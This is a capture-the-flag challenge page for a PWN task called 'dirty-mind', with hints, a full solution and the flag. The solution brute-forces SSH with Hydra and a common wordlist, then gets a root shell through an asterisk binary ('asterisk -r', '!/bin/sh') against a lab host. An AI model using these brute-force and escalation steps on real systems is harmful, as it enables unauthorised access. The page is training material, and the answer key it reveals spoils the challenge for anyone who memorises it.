# Dirty Mind Metadata
**Year of Creation:** 2026  
**Author(s):** Connor Gallagher (ConSilverstone)  
**Challenge Name:** dirty-mind  
**Category:** PWN  
**Difficulty:** Medium-Hard  

## Description:  
Notorious online criminal dirtymind has no interest in security.  
They barely know linux, really just using it as a dumping ground to store explicit images they like around the web.  
Default configuration though their little cousin used the laptop often and was caught using some phone software to spy on coworkers. Just a real bad family.  
  
nc 10.0.0.42:22  
  
<details>
<summary>Hint 1:</summary>
Something everyone has, and people will pay good money to see it.  
</details>

<details>
<summary>Hint 2:</summary>
If I were to draw a cat's behind, i'd probably use a certain symbol but I can't remember what it is called.  
</details>
  
<details>
<summary>Solution & Flag</summary>
Solution: Secure shell connection that can be bruteforced as the password is weak (butthole) to gain access. Either by a lucky guess or using Hydra. Good example on <link href="https://www.geeksforgeeks.org/linux-unix/how-to-use-hydra-to-brute-force-ssh-connections/"> geekforgeeks. </link>   
<details>
<summary>Example</summary>
hydra -L user.txt (containing username dirtymind) -P /usr/share/wordlists/rockyou.txt 10.0.0.42 ssh -t 4  
</details>

Once entry has been retrieved the find command can be used to reveal unusal file permissions and cross reference unexpected files using <link href="https://gtfobins.org/GTFO"> GTFOBins </link>. The Asterisk executable will appear to be vulnrable at a user level (dirtymind) to which:  
asterisk -r  
!/bin/sh  
can be perfomed by any user to reach root access.  
  
Final hurdle is that in the root/MyCollection folder the flag exists under hole.jpg but it is the wrong file format. This could be identified by using:  
  
find /dirtymind/MyCollection -type f -name "*.jpg" -exec file {} \;
  
Which will reveal the line "hole.jpg: ASCII text" which gives it away. Then a simple use mv hole.jpg hole.txt to correct the format and then a simple cat hole.txt command will reveal the flag.
  
Flag: LTDH2026{* ASSterisk_3scape *} (without spaces)
</details>
